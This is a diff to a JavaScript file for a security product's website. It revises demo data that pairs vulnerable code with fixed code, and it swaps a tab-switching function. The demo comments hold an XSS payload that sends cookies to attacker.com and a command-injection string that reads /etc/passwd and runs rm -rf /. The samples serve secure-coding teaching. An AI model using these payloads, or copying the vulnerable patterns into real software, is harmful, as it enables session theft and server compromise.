@@ -1,9 +1,8 @@
 /**
- * Shipcheck Static Website Interactivity
+ * Shipcheck Presentation Deck & Product Website Logic
  * 100% Client-Side — Zero Backend Needed
  */
 
-// Presets for the Interactive AI Remediation Playground
 const PLAYGROUND_DATA = {
   sqli: {
     title: "Blind & Classic SQL Injection",
@@ -11,7 +10,7 @@ const PLAYGROUND_DATA = {
     scoreBefore: "42 / 100",
     scoreAfter: "95 / 100",
     delta: "+53 Security Score",
-    explanation: "User input is directly concatenated into SQL query strings, allowing attackers to execute arbitrary database queries, bypass authentication, and dump user credentials.",
+    explanation: "User input is directly concatenated into SQL strings, allowing attackers to bypass authentication, dump database tables, or execute arbitrary commands.",
     beforeCode: `// ❌ VULNERABLE: Direct f-string string concatenation
 @app.post("/api/login")
 def login(username: str, password: str, db: sqlite3.Connection):
@@ -38,7 +37,7 @@ def login(credentials: LoginRequest, db: sqlite3.Connection):
     scoreBefore: "55 / 100",
     scoreAfter: "98 / 100",
     delta: "+43 Security Score",
-    explanation: "Hardcoded production master secrets, database passwords, and API tokens in the source repository allow anyone with read access to compromise the environment.",
+    explanation: "Hardcoded production master secrets, database passwords, and API tokens in the source code allow anyone with read access to compromise the environment.",
     beforeCode: `// ❌ VULNERABLE: Hardcoded credential constants
 DATABASE_URI = "postgresql://admin:P@ssw0rd2026_ShipCheck!@prod-db.internal:5432/core"
 JWT_SECRET_KEY = "super_secret_master_token_do_not_share"
@@ -68,7 +67,7 @@ def get_auth_token(user_id: str):
     beforeCode: `// ❌ VULNERABLE: Direct innerHTML injection
 function renderUserProfile(user) {
     const banner = document.getElementById("profile-header");
-    // If user.bio contains "<script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>"
+    // Attacker payload: <script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>
     banner.innerHTML = "<h1>Welcome, " + user.name + "</h1><p>" + user.bio + "</p>";
 }`,
     afterCode: `// ✅ SHIPCHECK AI FIX: DOM textContent & Sanitization
@@ -91,8 +90,8 @@ function renderUserProfile(user) {
     scoreBefore: "30 / 100",
     scoreAfter: "99 / 100",
     delta: "+69 Security Score",
-    explanation: "Executing arbitrary shell strings with user-controlled parameters lets remote attackers execute shell commands, read filesystem files, and compromise the server.",
-    beforeCode: `// ❌ VULNERABLE: os.system / subprocess with shell=True
+    explanation: "Executing arbitrary shell strings with user-controlled parameters lets remote attackers execute arbitrary commands, read filesystem files, and compromise the server.",
+    beforeCode: `// ❌ VULNERABLE: os.popen with unvalidated input
 import os
 
 @app.get("/api/diagnostics/ping")
@@ -100,13 +99,12 @@ def run_ping(target_host: str):
     # Payload: 127.0.0.1; cat /etc/passwd; rm -rf /
     output = os.popen(f"ping -c 1 {target_host}").read()
     return {"diagnostic": output}`,
-    afterCode: `// ✅ SHIPCHECK AI FIX: Input Validation & Subprocess Array Args
+    afterCode: `// ✅ SHIPCHECK AI FIX: Strict Input Validation & Subprocess Array
 import ipaddress
 import subprocess
 
 @app.get("/api/diagnostics/ping")
 def run_ping(target_host: str):
-    # Strict validation: host must be a valid IP address
     ipaddress.ip_address(target_host)
     res = subprocess.run(["ping", "-c", "1", target_host], capture_output=True, text=True, check=True)
     return {"diagnostic": res.stdout}`
@@ -116,11 +114,36 @@ def run_ping(target_host: str):
 document.addEventListener('DOMContentLoaded', () => {
   detectUserOS();
   initCopyButtons();
+  initTourTabs();
   initPlayground();
-  initTerminalTabs();
   initFAQ();
   animateTelemetryStats();
 });
+
+/**
+ * Switch interactive product tour screenshots / slides
+ */
+function initTourTabs() {
+  const tabs = document.querySelectorAll('.tour-tab-btn');
+  const slides = document.querySelectorAll('.mockup-slide');
+
+  tabs.forEach(tab => {
+    tab.addEventListener('click', () => {
+      const target = tab.getAttribute('data-tour');
+
+      tabs.forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+
+      slides.forEach(slide => {
+        if (slide.id === `slide-${target}`) {
+          slide.style.display = 'block';
+        } else {
+          slide.style.display = 'none';
+        }
+      });
+    });
+  });
+}
 
 /**
  * Auto-detect client OS and highlight the relevant download card
@@ -146,7 +169,7 @@ function detectUserOS() {
 }
 
 /**
- * Handle copy to clipboard for quick commands and checksums
+ * Handle copy to clipboard
  */
 function initCopyButtons() {
   document.querySelectorAll('.copy-trigger').forEach(btn => {
@@ -201,33 +224,7 @@ function initPlayground() {
     });
   });
 
-  // Load initial preset
   updatePlayground('sqli');
-}
-
-/**
- * Switch terminal simulator tabs
- */
-function initTerminalTabs() {
-  const tabs = document.querySelectorAll('.term-tab');
-  const snippets = document.querySelectorAll('.term-snippet-view');
-
-  tabs.forEach(tab => {
-    tab.addEventListener('click', () => {
-      const tabTarget = tab.getAttribute('data-tab');
-
-      tabs.forEach(t => t.classList.remove('active'));
-      tab.classList.add('active');
-
-      snippets.forEach(view => {
-        if (view.id === `term-${tabTarget}`) {
-          view.style.display = 'block';
-        } else {
-          view.style.display = 'none';
-        }
-      });
-    });
-  });
 }
 
 /**
